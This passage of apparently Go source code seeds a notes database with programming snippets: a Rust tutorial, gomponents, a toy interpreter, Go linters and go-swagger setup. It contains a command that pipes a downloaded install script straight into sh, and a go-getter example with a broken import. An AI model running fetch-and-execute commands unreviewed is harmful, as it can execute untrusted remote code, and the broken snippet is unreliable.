lifetime\n  let message = get_message();\n  println!(\"message: {}\", message); // hello\n  println!(\"message: {}\", get_message_static()); // hello\n  \n  // vector\n  let v: Vec<i32> = Vec::new(); // empty\n  let v = vec![1, 2, 3];\n  let v: Vec<i32> = vec![]; // empty\n  let v = vec![5; 3]; // vec![5, 5, 5];\n  let mut users = Vec::new();\n  users.push(\"Tom\");\n  println!(\"1. {}\", users[0]);    // 1. Tom\n  users[0] = \"Alice\";\n  println!(\"1. {}\", users[0]);    // 1. Alice\n  users.push(\"Bob\");\n  for user in &users { // если просто users, то это передаст владение вектором циклу for и users нельзя будет больше использовать\n    println!(\"{}\", user);\n  }\n  println!(\"length: {}\", users.len());    // length: 2\n  let removed_element = users.pop();   // удаляем элемент из конца, возвращается Option<T>\n  println!(\"Удаленный элемент: {}\", removed_element.unwrap());    // Удаленный элемент: Bob\n  \n  // string\n  let message = String::new(); // empty\n  let message = String::from(\"Hello\");\n  let message = \"hello\".to_string();\n  println!(\"length: {}\", message.chars().count()); // 5\n  let mut message = String::from(\"hello\");\n  message.push('?');\n  println!(\"Message: {}\", message); // Message: hello?\n  message.push_str(\" Rust\");\n  println!(\"Message: {}\", message); // Message: hello? Rust\n  let hello = String::from(\"hello \");\n  let rust = String::from(\"Rust\");\n  let message = hello + &rust;\n  println!(\"Message: {}\", message); // Message: hello Rust\n  // println!(\"{}\", hello);   // !Ошибка владение данными перешло от переменной hello к message\n  let hello = String::from(\"hello \");\n  let rust = String::from(\"Rust\");\n  let message = format!(\"{} {} on Metanit.com\", hello, rust);\n  println!(\"{}\", message);    // hello Rust on Metanit.com\n  \n  // hashmap\n  let mut countries: HashMap<String, i32> = HashMap::new();\n  countries.insert(String::from(\"Германия\"), 82);\n  countries.insert(String::from(\"Франция\"), 67);\n  println!(\"Число элементов: {}\", countries.len()); // Число элементов: 2\n  let mut countries = HashMap::new();\n  let population = 82;\n  let country = String::from(\"Германия\");\n  countries.insert(country, population);\n  println!(\"population: {} млн. чел.\", population); // population можно использовать\n  // println!(\"country: {}\", country); // ! Ошибка country нельзя использовать\n  // countries.insert(&country, population); // так мы не передадим владение\n  let population = countries[\"Германия\"];\n  println!(\"Germany : {}\", population); // Germany : 82\n  // let population = countries[\"France\"]; // error: no entry found for key\n  let population = countries.get(\"France\");\n  if population == Option::None {\n    println!(\"Элемента с ключом France не существует\");\n  } else {\n    println!(\"France : {}\", population.unwrap());\n  }\n  for (key, value) in &countries {\n    println!(\"{}: {}\", key, value);\n  }\n  if countries.contains_key(\"France\") {\n    println!(\"{}\", countries[\"France\"]);\n  }\n  let mut countries = HashMap::new();\n  countries.insert(String::from(\"Germany\"), 82);\n  countries.entry(String::from(\"France\")).or_insert(67);\n  countries.entry(String::from(\"Germany\")).or_insert(250);\n  println!(\"{}\", countries[\"Germany\"]);       // 82\n  println!(\"{}\", countries[\"France\"]);        // 67\n  countries.remove(\"Germany\");\n  countries.clear();  // очищаем объект HashMap\n  \n  // module\n  my_module::pub_test(); // Hello from my_module\n  // my_module::private_test(); // error: function is private\n  let mut person = my_module::Person{ name: \"Tom\".to_string(), age: 22 };\n  println!(\"{}\", person.name); // Tom\n  my_module::inner_module::test(); // Hello from inner_module\n  my_module::child_module::test(); // Hello from my_module\n  // use my_module::inner_module::hello;\n  test(); // Hello from inner_module\n  // use my_module::inner_module::*;\n  // use my_module::inner_module::{hello, bye}; // hello(); buy();\n  // use my_module::inner_module::{self, hello, bye}; // inner_module::welcome();\n  // use my_module::inner_module; // inner_module::hello();\n  // use my_module::inner_module::hello as simple_hello; // simple_hello();\n  // external file lifetime.rs:\n  // pub mod messages{\n  //   pub mod message_functions{\n  //     pub fn hello(){ println! (\"Hello\"); }\n  //     pub fn bye(){ println! (\"Good bye\"); }\n  //   }\n  // }\n  // and in main.rs we include them:\n  // mod lifetime;\n  // use lifetime::messages::message_functions::{hello, bye};\n  \n  // error\n  // panic!(\"непредвиденная ошибка\"); // выводит на консоль сообщение об ошибке, очищает стек и завершает выполнение программы\n  // enum Result<T, E> {\n  //   Ok(T),\n  //   Err(E),\n  // }\n  let tom_result = create_person(\"Tom\", 36);\n  match tom_result{\n    Ok(tom) => println!(\"Name: {}  Age: {}\", tom.name, tom.age), // Name: Tom  Age: 36\n    Err(err_message) => println!(\"{}\", err_message)\n    // Err(err_message) => panic!(\"Возникла проблема: {}\", err_message)\n  }\n  let tom_result = create_person(\"Tom\", 36);\n  let tom = match tom_result{\n    Ok(person) => person,\n    Err(err_message) => panic!(\"Возникла проблема: {}\", err_message)\n  };\n  println!(\"Name: {}  Age: {}\", tom.name, tom.age); // Name: Tom  Age: 36\n  // Если возвращенный объект Result представляет константу Ok, то метод unwrap() возвращает объект,\n  // который содержится в константе Ok. Но если объект Result представляет константу Err, то метод unwrap() вызывает макрос panic!.\n  let tom = create_person(\"Tom\", 36).unwrap();\n  println!(\"Name: {}  Age: {}\", tom.name, tom.age);\n  let tom = create_person(\"Tom\", 36).expect(\"Что-то пошло не так....\"); // like unwrap with message\n  println!(\"Name: {}  Age: {}\", tom.name, tom.age);\n  let tom = create_person(\"Tom\", 36).unwrap_or_else(|error| { // обработка ошибки в анонимной функции\n    panic!(\"Возникла проблема: {}\", error)\n  });\n  let tom_result = create_person_err(\"Tom\", 36);\n  let tom = match tom_result{\n    Ok(person) => person,\n    Err(error) => match error.kind {\n      ErrorKind::InvalidAge(message) => panic!(\"{}\", message),\n      ErrorKind::InvalidName(message) => panic!(\"{}\", message)\n    }\n  };\n  let tom = create_person_err(\"Tom\", 36).unwrap_or_else(|error| {\n    match error.kind {\n      ErrorKind::InvalidAge(message) => panic!(\"{}\", message),\n      ErrorKind::InvalidName(message) => panic!(\"{}\", message)\n    }\n  });\n  // fn main() ->Result<(), String>{\n  //   let tom = create_person(\"Tom\", 36)?;\n  //   println!(\"Name: {}  Age: {}\", tom.name, tom.age);\n  //   Ok(())\n  // }\n  \n  // cargo\n  // cargo new hello\n  // in Cargo.toml file:\n  // [dependencies]\n  // rand = \"0.8.3\"\n  // in main.rs file:\n  // use rand::Rng;  // используем пакет rand\n  // let random_number = rand::thread_rng().gen_range(0..10);\n  // cargo run\n  \n  // stdin\n  // use std::io;\n  // fn main()  -> io::Result<()>{\n  //   let mut input = String::new();\n  //   println!(\"Введите свое имя: \");\n  //   io::stdin().read_line(&mut input)?;\n  //   println!(\"Ваш имя: {}\", input);\n  //   Ok(())\n  // }\n}\n\nfn hello(){ println!(\"Hello Rust\"); }\nfn sum(a: i32, b: i32) -> i32\n{\n  a + b\n  // return a + b; //ok\n  // a + b; //will return (), no i32\n}\nstruct Person {\n  name: String,\n  age: u8,\n  height: f32,\n}\nstruct Point(i32, i32);\nstruct Distance(Point, Point);\nenum OperationType {\n  Add,\n  Subtract,\n}\nenum DayTime {\n  Morning(String),\n  Evening(String),\n}\nfn display_message(message: String) {println!(\"message: {}\", message);}\nfn display_message_ref(message: &String) {println!(\"message: {}\", message);}\nfn change_message(mes: &mut String) {mes.push('!');}\nimpl Person {\n  fn display(&self) {println!(\"Name: {}  Age: {}\", &self.name, &self.age);}\n  fn is_older(&self, other: &Person) -> bool {self.age > other.age}\n  fn change_age(&mut self, age: u8) {self.age = age;}\n  fn create(user_name: &str, user_age: u8) -> Person {\n    Person {\n      name: String::from(user_name),\n      age: user_age,\n      height: 159.7,\n    }\n  }\n}\ntrait Printer {\n  fn print(&self);\n  fn preview(&self) -> String;\n  fn print_something(&self) {println!(\"something...\");}\n}\nimpl Printer for Person {\n  fn print(&self) {println!(\"Person {}; age: {}\", self.name, self.age);}\n  fn preview(&self) -> String {format!(\"[Предпросмотр] Person {}; age: {}\", self.name, self.age)}\n}\nfn display_printable(printable: &impl Printer) {printable.print();}\nfn create_printable() -> impl Printer {\n  return Person {\n    name: \"Bob\".to_string(),\n    age: 23,\n    height: 178.0,\n  };\n}\nstruct PersonGen<T, S> {\n  id: T,\n  name: String,\n  place: S,\n}\nenum DayTimeGen<T> {\n  Morning(T),\n  Evening(T),\n}\nfn receive<T>(item: T) -> T {item}\nimpl<T, S> PersonGen<T, S> {\n  fn get_id(&self) -> &T {\n    &self.id\n  }\n}\nimpl PersonGen<i32, i32> {\n  fn get_id_i32(&self) -> &i32 {&self.id}\n}\nfn display_printable_gen<T: Printer>(printable: &T) {printable.print();}\nfn display_printable_gen_where<T>(printable: &T) where T: Printer {printable.print();}\ntrait Sender { fn send(&self); }\nimpl Sender for Person {\n  fn send(&self) {println!(\"Сообщение отправлено\");}\n}\nfn print_send(obj: &(impl Printer + Sender)) {\n//fn print_send<T: Printer + Sender>(obj: &T) {\n//fn print_send<T>(obj: &T) where T: Printer + Sender{\n// fn process<T: Printer + Editor, S: Printer + Sender>(obj1: &T, obj2: &S){\n  obj.print();\n  obj.send();\n}\nfn get_message<'a>() -> &'a str {\"hello\"}\n// fn check_name<'a, 'b>(name: &'a str, default: &'b str) -> &'a str {\n//     if name == \"admin\" { default}\n//     else {name}\n// }\nfn get_message_static() -> &'static str {\"hello\"}\nmod my_module {\n  // определяем модуль\n  pub fn pub_test() {  // определяем публичную функцию - с атрибутом pub\n    println!(\"Hello from my_module\");\n  }\n  fn private_test() {  // определяем публичную функцию - с атрибутом pub\n    println!(\"Hello from my_module\");\n  }\n  pub struct Person {\n    pub name: String,\n    pub age: u8\n  }\n  pub mod inner_module{\n    pub fn test(){println! (\"Hello from inner_module\");}\n    pub fn hello(){println! (\"Hello\");}\n    pub fn bye(){println! (\"Good bye\");}\n    pub fn welcome(){println! (\"Welcome\");}\n  }\n  pub mod child_module{\n    pub fn test(){\n      super::pub_test(); // обращаемся к функции из родительского модуля\n    }\n  }\n}\nfn create_person(username: &str, userage: u8) -> Result<Person, String>{\n  if userage < 110{\n    let new_person = Person{name: String::from(username), age: userage, height: 150.0 };\n    Result::Ok(new_person)\n  }\n  else {\n    Result::Err(String::from(\"Некорректный возраст. Возраст должен быть меньше 110\"))\n  }\n}\nenum ErrorKind{\n  InvalidAge(String),\n  InvalidName(String)\n}\nstruct PersonError {kind: ErrorKind}\nfn create_person_err(username: &str, userage: u8) -> Result<Person, PersonError>{\n  if username.len() < 3{\n    Result::Err(\n      PersonError{kind: ErrorKind::InvalidName(String::from(\"Некорректное имя. Длина имени должна быть больше 2-х символов\"))}\n    )\n  }\n  else if userage > 110{\n    Result::Err(\n      PersonError{kind: ErrorKind::InvalidAge(String::from(\"Некорректный возраст. Возраст должен быть меньше 110\"))}\n    )\n  }\n  else{\n    let new_person = Person{name: String::from(username), age: userage, height: 143.0 };\n    Result::Ok(new_person)\n  }\n}")
	create(db, "Golang frontend with gomponents\n(tags: frontend gomponents)\n---\n\nhttps://www.gomponents.com/\n\npackage main\n\nimport (\n  \"net/http\"\n  \"time\"\n\n  g \"github.com/maragudk/gomponents\"\n  c \"github.com/maragudk/gomponents/components\"\n  . \"github.com/maragudk/gomponents/html\"\n)\n\nfunc main() {\n  http.Handle(\"/\", createHandler(indexPage()))\n  http.Handle(\"/contact\", createHandler(contactPage()))\n  http.Handle(\"/about\", createHandler(aboutPage()))\n\n  _ = http.ListenAndServe(\"localhost:8080\", nil)\n}\n\nfunc createHandler(title string, body g.Node) http.HandlerFunc {\n  return func(w http.ResponseWriter, r *http.Request) {\n    // Rendering a Node is as simple as calling Render and passing an io.Writer\n    _ = Page(title, r.URL.Path, body).Render(w)\n  }\n}\n\nfunc indexPage() (string, g.Node) {\n  return \"Welcome!\", Div(\n    H1(g.Text(\"Welcome to this example page\")),\n    P(g.Text(\"I hope it will make you happy. 😄 It's using TailwindCSS for styling.\")),\n  )\n}\n\nfunc contactPage() (string, g.Node) {\n  return \"Contact\", Div(\n    H1(g.Text(\"Contact us\")),\n    P(g.Text(\"Just do it.\")),\n  )\n}\n\nfunc aboutPage() (string, g.Node) {\n  return \"About\", Div(\n    H1(g.Text(\"About this site\")),\n    P(g.Text(\"This is a site showing off gomponents.\")),\n  )\n}\n\nfunc Page(title, path string, body g.Node) g.Node {\n  // HTML5 boilerplate document\n  return c.HTML5(c.HTML5Props{\n    Title:    title,\n    Language: \"en\",\n    Head: []g.Node{\n      Link(Rel(\"stylesheet\"), Href(\"https://unpkg.com/tailwindcss@^2.1.x/dist/base.min.css\")),\n      Link(Rel(\"stylesheet\"), Href(\"https://unpkg.com/tailwindcss@^2.1.x/dist/components.min.css\")),\n      Link(Rel(\"stylesheet\"), Href(\"https://unpkg.com/@tailwindcss/typography@0.4.x/dist/typography.min.css\")),\n      Link(Rel(\"stylesheet\"), Href(\"https://unpkg.com/tailwindcss@^2.1.x/dist/utilities.min.css\")),\n    },\n    Body: []g.Node{\n      Navbar(path, []PageLink{\n        {Path: \"/contact\", Name: \"Contact\"},\n        {Path: \"/about\", Name: \"About\"},\n      }),\n      Container(\n        Prose(body),\n        PageFooter(),\n      ),\n    },\n  })\n}\n\ntype PageLink struct {\n  Path string\n  Name string\n}\n\nfunc Navbar(currentPath string, links []PageLink) g.Node {\n  return Nav(Class(\"bg-gray-700 mb-4\"),\n    Container(\n      Div(Class(\"flex items-center space-x-4 h-16\"),\n        NavbarLink(\"/\", \"Home\", currentPath == \"/\"),\n\n        // We can Map custom slices to Nodes\n        g.Group(g.Map(len(links), func(i int) g.Node {\n          return NavbarLink(links[i].Path, links[i].Name, currentPath == links[i].Path)\n        })),\n      ),\n    ),\n  )\n}\n\n// NavbarLink is a link in the Navbar.\nfunc NavbarLink(path, text string, active bool) g.Node {\n  return A(Href(path), g.Text(text),\n    // Apply CSS classes conditionally\n    c.Classes{\n      \"px-3 py-2 rounded-md text-sm font-medium focus:outline-none focus:text-white focus:bg-gray-700\": true,\n      \"text-white bg-gray-900\":                           active,\n      \"text-gray-300 hover:text-white hover:bg-gray-700\": !active,\n    },\n  )\n}\n\nfunc Container(children ...g.Node) g.Node {\n  return Div(Class(\"max-w-7xl mx-auto px-2 sm:px-6 lg:px-8\"), g.Group(children))\n}\n\nfunc Prose(children ...g.Node) g.Node {\n  return Div(Class(\"prose\"), g.Group(children))\n}\n\nfunc PageFooter() g.Node {\n  return Footer(Class(\"prose prose-sm prose-indigo\"),\n    P(\n      // We can use string interpolation directly, like fmt.Sprintf.\n      g.Textf(\"Rendered %v. \", time.Now().Format(time.RFC3339)),\n\n      // Conditional inclusion\n      g.If(time.Now().Second()%2 == 0, g.Text(\"It's an even second.\")),\n      g.If(time.Now().Second()%2 == 1, g.Text(\"It's an odd second.\")),\n    ),\n\n    P(A(Href(\"https://www.gomponents.com\"), g.Text(\"gomponents\"))),\n  )\n}")

	create(db, "Handmade primitive compiler\n(tags: handmade compiler)\n---\n\nhttps://github.com/utimur/proggraming-lang-course\n\n// code.txt\nсумма РАВНО ( 5 МИНУС 9 ) ПЛЮС 5;\nКОНСОЛЬ сумма;\nКОНСОЛЬ ( 10 МИНУС 5 );\n\n// main.go\npackage main\n\nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"os\"\n)\n\nfunc main() {\n  file := os.Args[1]\n  codeBytes, err := ioutil.ReadFile(file)\n  if err != nil {\n    panic(err)\n  }\n  code := string(codeBytes)\n  fmt.Println(code)\n\n  lexer := NewLexer(code)\n  _, err = lexer.Analysis()\n  if err != nil {\n    panic(err)\n  }\n  \n  parser := NewParser(lexer.tokenList)\n  rootNode, err := parser.parseCode()\n  if err != nil {\n    panic(err)\n  }\n  \n  parser.run(rootNode)\n}\n\n// token.go\npackage main\n\ntype Token struct {\n  tokenType TokenType\n  text      string\n  pos       int\n}\n\nfunc NewToken(tokenType TokenType, text string, pos int) Token {\n  return Token{\n    tokenType: tokenType,\n    text:      text,\n    pos:       pos,\n  }\n}\n\n// tokentype.go\npackage main\n\ntype TokenType struct {\n  name  string\n  regex string\n}\n\nfunc NewTokenType(name string, regex string) TokenType {\n  return TokenType{\n    name:  name,\n    regex: regex,\n  }\n}\n\nvar TokenTypesList = map[string]TokenType{\n  \"NUMBER\":    NewTokenType(\"NUMBER\", \"[0-9]*\"),\n  \"VARIABLE\":  NewTokenType(\"VARIABLE\", \"[а-я]*\"),\n  \"SEMICOLON\": NewTokenType(\"SEMICOLON\", \";\"),\n  \"SPACE\":     NewTokenType(\"SPACE\", \"[ \\\\n\\\\t\\\\r]\"),\n  \"ASSIGN\":    NewTokenType(\"ASSIGN\", \"РАВНО\"),\n  \"LOG\":       NewTokenType(\"LOG\", \"КОНСОЛЬ\"),\n  \"PLUS\":      NewTokenType(\"PLUS\", \"ПЛЮС\"),\n  \"MINUS\":     NewTokenType(\"MINUS\", \"МИНУС\"),\n  \"LPAR\":      NewTokenType(\"LPAR\", \"\\\\(\"),\n  \"RPAR\":      NewTokenType(\"RPAR\", \"\\\\)\"),\n}\n\n// node.go\npackage main\n\nimport \"fmt\"\n\nconst (\n  _ = iota\n  Variable\n  Number\n  UnaryOperation\n  Statements\n  Assign\n  BinOperation\n)\n\ntype AssignNode struct {\n  operator  Token\n  leftNode  *ExpressionNode\n  rightNode *ExpressionNode\n}\n\nfunc NewAssignNode(operator Token, leftNode *ExpressionNode, rightNode *ExpressionNode) *AssignNode {\n  return &AssignNode{operator: operator, leftNode: leftNode, rightNode: rightNode}\n}\n\ntype BinOperationNode struct {\n  operator  Token\n  leftNode  ExpressionNodeInterface\n  rightNode ExpressionNodeInterface\n}\n\nfunc NewBinOperationNode(operator Token, leftNode ExpressionNodeInterface, rightNode ExpressionNodeInterface) *BinOperationNode {\n  return &BinOperationNode{operator: operator, leftNode: leftNode, rightNode: rightNode}\n}\n\ntype ExpressionNode struct{}\n\ntype NumberNode struct {\n  number Token\n}\n\nfunc NewNumberNode(number Token) *NumberNode {\n  return &NumberNode{number: number}\n}\n\ntype StatementsNode struct {\n  codeStrings []ExpressionNodeInterface\n}\n\nfunc NewStatementsNode() *StatementsNode {\n  return &StatementsNode{codeStrings: make([]ExpressionNodeInterface, 0)}\n}\n\nfunc (n *StatementsNode) addNode(node ExpressionNodeInterface) {\n  n.codeStrings = append(n.codeStrings, node)\n}\n\ntype UnaryOperationNode struct {\n  operator Token\n  operand  ExpressionNodeInterface\n}\n\nfunc NewUnaryOperationNode(operator Token, operand ExpressionNodeInterface) *UnaryOperationNode {\n  return &UnaryOperationNode{operator: operator, operand: operand}\n}\n\ntype VariableNode struct {\n  variable Token\n  value    int\n}\n\nfunc (n VariableNode) String() string {\n  return fmt.Sprintf(\"%s = %d\", n.variable.text, n.value)\n}\n\nfunc NewVariableNode(variable Token) *VariableNode {\n  return &VariableNode{variable: variable}\n}\n\ntype ExpressionNodeInterface interface {\n  GetType() int\n}\n\nfunc (n *VariableNode) GetType() int       { return Variable }\nfunc (n *NumberNode) GetType() int         { return Number }\nfunc (n *UnaryOperationNode) GetType() int { return UnaryOperation }\nfunc (n *StatementsNode) GetType() int     { return Statements }\nfunc (n *AssignNode) GetType() int         { return Assign }\nfunc (n *BinOperationNode) GetType() int   { return BinOperation }\n\n// lexer.go\npackage main\n\nimport (\n  \"fmt\"\n  \"regexp\"\n)\n\ntype Lexer struct {\n  code      string\n  pos       int\n  tokenList []Token\n}\n\nfunc NewLexer(code string) *Lexer {\n  return &Lexer{\n    code: code,\n  }\n}\n\nfunc (l *Lexer) Analysis() ([]Token, error) {\n  flag := true\n  var err error\n  for flag {\n    flag, err = l.nextToken()\n    if err != nil {\n      panic(err)\n    }\n  }\n\n  var buf []Token\n  for _, token := range l.tokenList {\n    if token.tokenType.name != TokenTypesList[\"SPACE\"].name && token.text != \"\" {\n      buf = append(buf, token)\n    }\n  }\n  l.tokenList = buf\n\n  return l.tokenList, err\n}\n\nfunc (l *Lexer) nextToken() (bool, error) {\n  if l.pos >= len(l.code) {\n    return false, nil\n  }\n\n  for _, tokenType := range TokenTypesList {\n    regex := regexp.MustCompile(\"^\" + tokenType.regex)\n    result := regex.FindAllString(l.code[l.pos:], -1)\n    if result != nil {\n      token := NewToken(tokenType, result[0], l.pos)\n      l.pos += len(result[0])\n      l.tokenList = append(l.tokenList, token)\n      return true, nil\n    }\n  }\n  return false, fmt.Errorf(\"на позиции %d обнаружена ошибка\", l.pos)\n}\n\n// parser.go\npackage main\n\nimport (\n  \"fmt\"\n  \"strconv\"\n)\n\ntype Parser struct {\n  tokens []Token\n  pos    int\n  scope  map[string]*VariableNode\n}\n\nfunc NewParser(tokens []Token) Parser {\n  return Parser{\n    tokens: tokens,\n    scope:  make(map[string]*VariableNode),\n  }\n}\n\nfunc (p *Parser) match(expected ...TokenType) (Token, bool) {\n  if p.pos < len(p.tokens) {\n    currentToken := p.tokens[p.pos]\n    for _, tokenType := range expected {\n      if tokenType.name == currentToken.tokenType.name {\n        p.pos++\n        return currentToken, true\n      }\n    }\n  }\n  return Token{}, false\n}\n\nfunc (p *Parser) require(expected ...TokenType) (Token, error) {\n\n  if token, exists := p.match(expected...); exists {\n    return token, nil\n  }\n  return Token{}, fmt.Errorf(`на позиции %d ожидается %s`, p.pos, expected[0].name)\n}\n\nfunc (p *Parser) parseVariableOrNumber() (ExpressionNodeInterface, error) {\n  if variable, ok := p.match(TokenTypesList[\"VARIABLE\"]); ok {\n    return NewVariableNode(variable), nil\n  }\n  if number, ok := p.match(TokenTypesList[\"NUMBER\"]); ok {\n    return NewNumberNode(number), nil\n  }\n  return nil, fmt.Errorf(`ожидается переменная или число на %d позиции`, p.pos)\n}\n\nfunc (p *Parser) parsePrint() (ExpressionNodeInterface, error) {\n  if operatorLog, ok := p.match(TokenTypesList[\"LOG\"]); ok {\n    formula, err := p.parseFormula()\n    if err != nil {\n      panic(err)\n      return nil, err\n    }\n    return NewUnaryOperationNode(operatorLog, formula), nil\n  }\n  return nil, fmt.Errorf(`ожидается унарный оператор КОНСОЛЬ на %d позиции`, p.pos)\n}\n\nfunc (p *Parser) parseParentheses() (ExpressionNodeInterface, error) {\n  if _, ok := p.match(TokenTypesList[\"LPAR\"]); ok {\n    node, err := p.parseFormula()\n    if err != nil {\n      panic(err)\n      return nil, err\n    }\n    _, err = p.require(TokenTypesList[\"RPAR\"])\n    return node, err\n  }\n  return p.parseVariableOrNumber()\n}\n\nfunc (p *Parser) parseFormula() (ExpressionNodeInterface, error) {\n  leftNode, err := p.parseParentheses()\n  if err != nil {\n    panic(err)\n    return nil, err\n  }\n  operator, ok := p.match(TokenTypesList[\"MINUS\"], TokenTypesList[\"PLUS\"])\n  for ok {\n    rightNode, err := p.parseParentheses()\n    if err != nil {\n      panic(err)\n      return nil, err\n    }\n    leftNode = NewBinOperationNode(operator, leftNode, rightNode)\n    operator, ok = p.match(TokenTypesList[\"MINUS\"], TokenTypesList[\"PLUS\"])\n  }\n  return leftNode, err\n}\n\nfunc (p *Parser) parseExpression() (ExpressionNodeInterface, error) {\n\n  if _, exists := p.match(TokenTypesList[\"VARIABLE\"]); !exists {\n    printNode, err := p.parsePrint()\n    return printNode, err\n  }\n  p.pos--\n  variableNode, err := p.parseVariableOrNumber()\n  if err != nil {\n    panic(err)\n    return nil, err\n  }\n  if assignOperator, ok := p.match(TokenTypesList[\"ASSIGN\"]); ok {\n    rightFormulaNode, err := p.parseFormula()\n    if err != nil {\n      panic(err)\n      return nil, err\n    }\n    binaryNode := NewBinOperationNode(assignOperator, variableNode, rightFormulaNode)\n    return binaryNode, err\n  }\n  return nil, fmt.Errorf(`после переменной ожидается оператор присвоения на позиции %d`, p.pos)\n}\n\nfunc (p *Parser) parseCode() (ExpressionNodeInterface, error) {\n  root := NewStatementsNode()\n  for p.pos < len(p.tokens) {\n    codeStringNode, err := p.parseExpression()\n    if err != nil {\n      panic(err)\n      return nil, err\n    }\n    _, err = p.require(TokenTypesList[\"SEMICOLON\"])\n    if err != nil {\n      panic(err)\n      return nil, err\n    }\n    root.addNode(codeStringNode)\n  }\n  return root, nil\n}\n\nfunc (p *Parser) run(node ExpressionNodeInterface) interface{} {\n  switch val := node.(type) {\n  case *NumberNode:\n    res, err := strconv.Atoi(val.number.text)\n    if err != nil {\n      panic(err)\n    }\n    return res\n  case *UnaryOperationNode:\n    switch val.operator.tokenType.name {\n    case TokenTypesList[\"LOG\"].name:\n      fmt.Println(p.run(val.operand))\n      return nil\n    }\n  case *BinOperationNode:\n    switch val.operator.tokenType.name {\n    case TokenTypesList[\"PLUS\"].name:\n      l := p.run(val.leftNode)\n      r := p.run(val.rightNode)\n      if lVal, lOk := l.(int); lOk {\n        if rVal, rOk := r.(int); rOk {\n          return lVal + rVal\n        }\n      }\n      panic(\"bad plus\")\n    case TokenTypesList[\"MINUS\"].name:\n      l := p.run(val.leftNode)\n      r := p.run(val.rightNode)\n      if lVal, lOk := l.(int); lOk {\n        if rVal, rOk := r.(int); rOk {\n          return lVal - rVal\n        }\n      }\n      panic(\"bad minus\")\n    case TokenTypesList[\"ASSIGN\"].name:\n      res := p.run(val.rightNode)\n      variableNode := val.leftNode.(*VariableNode)\n      variableNode.value = res.(int)\n      p.scope[variableNode.variable.text] = variableNode\n      return res\n    }\n  case *VariableNode:\n    if variable, exists := p.scope[val.variable.text]; exists {\n      return variable\n    }\n    panic(fmt.Sprintf(`Переменная с названием %s не обнаружена`, val.variable.text))\n  case *StatementsNode:\n    for _, codeString := range val.codeStrings {\n      p.run(codeString)\n    }\n    return nil\n  default:\n    fmt.Printf(\"UNKNOWN: %+v\\n\", val)\n  }\n  panic(\"Ошибка!\")\n}")
	create(db, "Pretty print golang struct\n(tags: pretty print golang struct)\n---\n\nhttps://github.com/shurcooL/go-goon\n\nx := Lang{\n  Name: \"Go\",\n  Year: 2009,\n  URL:  \"http\",\n  Inner: &Inner{\n    Field1: \"Secret!\",\n  },\n}\n\ngoon.Dump(x)\n\n// Output:\n// (Lang)(Lang{\n//   Name: (string)(\"Go\"),\n//   Year: (int)(2009),\n//   URL:  (string)(\"http\"),\n//   Inner: (*Inner)(&Inner{\n//     Field1: (string)(\"Secret!\"),\n//     Field2: (int)(0),\n//   }),\n// })\n\nadderFunc := func(a int, b int) int {\n  c := a + b\n  return c\n}\n\ngoon.DumpExpr(adderFunc)\n\n// Output:\n// adderFunc = (func(int, int) int)(func(a int, b int) int {\n//   c := a + b\n//   return c\n// })")
	create(db, "Golang Finaliser and KeepAlive\n(tags: golang finalizer keepalive)\n---\n\nhttps://pkg.go.dev/runtime#KeepAlive\n\npackage main\n\nimport (\n  \"fmt\"\n  \"runtime\"\n  \"syscall\"\n)\n\nfunc main() {\n  type File struct { d int }\n  d, err := syscall.Open(\"f.txt\", syscall.O_RDONLY, 0)\n  if err != nil {\n    panic(err)\n  }\n  p := &File{d}\n  runtime.SetFinalizer(p, func(p *File) { syscall.Close(p.d) })\n  var buf [10]byte\n  n, err := syscall.Read(p.d, buf[:])\n  if err != nil {\n    panic(err)\n  }\n  runtime.KeepAlive(p) // это гарантирует, что финалайзер не запустится до KeepAlive функции\n  fmt.Printf(\"%d: %v %s\\n\", n, buf, buf)\n}")
	create(db, "Golang linters\n(tags: golang linter)\n---\n\nhttps://habr.com/ru/post/457970/\nhttps://github.com/golangci/awesome-go-linters\n\n// Local installation https://golangci-lint.run/usage/install/#local-installation\ncurl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s -- -b $(go env GOPATH)/bin v1.40.1\ngolangci-lint --version\n\n// run default linters \ngolangci-lint run\n//show all linters\ngolangci-lint help linters\n// run all linters\ngolangci-lint run --enable-all\n// run specific linters \ngolangci-lint run --disable-all -E gocritic -E nlreturn\n// run linters only for new changes\ngolangci-lint run --new-from-rev=origin/master\ngolangci-lint run --new-from-rev=HEAD~1\n// config for linters .golangci.yml")
	create(db, "Golang getter all source\n(tags: golang getter source)\n---\n\nhttps://github.com/hashicorp/go-getter\n\npackage main\n\nimport (\n  \"s\"\n)\n\nfunc main() {\n  getter.GetFile(\"f.txt\", \"https://github.com/hashicorp/go-getter/blob/main/get.go\")\n}")
	create(db, "Graph of golang project relations\n(tags: graph golang project)\n---\n\nhttps://github.com/ofabry/go-callvis\n\ngo get -u github.com/ofabry/go-callvis\ngo-callvis .\n// see http://localhost:7878\nroot@pc:/home/user1/projects/project1# /root/go/bin/go-callvis /home/user1/projects/project1/cmd/project1/main.go")
	create(db, "Swagger simple server\n(tags: swagger simple server)\n---\n\nhttps://goswagger.io/tutorial/todo-list.html\n\n// how to install\ndownload_url=$(curl -s https://api.github.com/repos/go-swagger/go-swagger/releases/latest | jq -r '.assets[] | select(.name | contains(\"'\"$(uname | tr '[:upper:]' '[:lower:]')\"'_amd64\")) | .browser_download_url')\ncurl -o /usr/local/bin/swagger -L'#' \"$download_url\"\nchmod +x /usr/local/bin/swagger\n\n// generate tampalte swagger.yml\nswagger init spec --title \"A Todo list application\" --description \"From the todo list tutorial on goswagger.io\" --version 1.0.0 --scheme http --consumes application/io.goswagger.examples.todo-list.v1+json --produces application/io.goswagger.examples.todo-list.v1+json\n\n// add path and definitions\n// swagger.yml\nswagger: \"2.0\"\ninfo:\n  description: From the todo list tutorial on goswagger.io\n  title: A Todo list application\n  version: 1.0.0\nconsumes:\n  - application/io.goswagger.examples.todo-list.v1+json\nproduces:\n  - application/io.goswagger.examples.todo-list.v1+json\nschemes:\n  - http\npaths:\n  /:\n    get:\n      tags:\n        - todos\n      operationId: findTodos\n      parameters:\n        - name: since\n          in: query\n          type: integer\n          format: int64\n        - name: limit\n          in: query\n          type: integer\n          format: int32\n          default: 20\n      responses:\n        200:\n          description: list the todo operations\n          schema:\n            type: array\n            items:\n              $ref: \"#/definitions/item\"\n        default:\n          description: generic error response\n          schema:\n            $ref: \"#/definitions/error\"\n    post:\n      tags:\n        - todos\n      operationId: addOne\n      parameters:\n        - name: body\n          in: body\n          schema:\n            $ref: \"#/definitions/item\"\n      responses:\n        201:\n          description: Created\n          schema:\n            $ref: \"#/definitions/item\"\n        default:\n          description: error\n          schema:\n            $ref: 